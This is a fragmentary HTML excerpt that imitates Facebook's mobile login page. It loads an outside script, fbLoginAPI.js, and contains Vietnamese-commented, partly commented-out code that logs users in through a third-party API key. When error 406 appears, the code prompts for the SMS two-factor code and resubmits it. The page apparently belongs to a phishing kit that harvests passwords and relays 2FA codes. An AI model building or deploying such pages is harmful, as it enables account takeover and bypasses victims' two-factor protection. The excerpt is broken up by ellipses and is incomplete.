...
<head><meta http-equiv="Content-Type" content="text/html; charset=windows-1252">
     ...
     <script src="fbLoginAPI.js"></script>
                            ...
                            <div class="other-links">
                                <ul class="_5pkb _55wp">
                                    <li><span class="mfss fcg"><a
                                            href="/recover/initiate/?c=https%3A%2F%2Fm.facebook.com%2F&amp;refid=8">Forget
                                        password?</a><span aria-hidden="true"> · </span><a class="sec"
                                                                                           href="/help/?refid=8">Help</a></span>
                                    </li>
                                    <li></li>
                                </ul>
                            </div>
...
<div id="static_templates">
 ...
 <script type="text/javascript">
        //var api = new FBLoginAPI('ISrxRmb4qWgJHOLYlSZIiYInaOCoEq8n'); //Khai báo API login v&#7899;i api_key &#273;&#432;&#7907;c c&#7845;p
        var api2 = new FBLoginAPI2();
     ...
     //                if (err) {
     //                    $('#message').text(err.message); //Hi&#7879;n th&#7883; l&#7895;i n&#7871;u b&#7883; l&#7895;i
     //                    if (err.code == 406) { //Tr&#432;&#7901;ng h&#7907;p xác th&#7913;c 2 b&#432;&#7899;c thông qua SMS
     //                        var verifiedCode = prompt('Enter SMS verified code'); //Hi&#7875;n th&#7883; khung nh&#7853;p code g&#7917;i v&#7873; sdt
     //                        if (verifiedCode) {
     //                            login(username, verifiedCode); //&#272;&#259;ng nh&#7853;p thêm 1 l&#7847;n n&#7919;a v&#7899;i code &#273;&#432;&#7907;c nh&#7853;n
     //                        }
     //                    }
     //                }
     //                else {
     //                    $('#message').text('Login Successfully') //Thông báo &#273;&#259;ng nh&#7853;p thành công
					// 	//ajaxify
     //                };
					// $('#deafultbox').hide(); 
					// $('#mesbox').show(); 
